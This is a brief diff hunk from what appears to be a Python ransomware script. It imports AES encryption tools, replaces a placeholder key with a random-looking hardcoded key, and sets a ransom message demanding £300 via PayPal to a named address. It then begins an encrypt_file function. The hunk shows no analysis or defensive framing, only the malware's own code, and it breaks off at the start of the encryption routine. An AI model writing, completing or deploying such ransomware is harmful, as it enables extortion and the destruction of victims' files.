@@ -5,7 +5,7 @@ import sys
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.padding import PKCS7
 from cryptography.hazmat.backends import default_backend
-key = b'0123456789abcdef0123456789abcdef'
+key = b'^xH09><eUIWrQr75A>eqW]eVLkj+5uIZ'
 message = 'All your personal files have been encrypted - if you ever want to see them again send £300 to CyberCriminal@mail.com on PayPal'
 def encrypt_file(filename):
     iv = os.urandom(16)
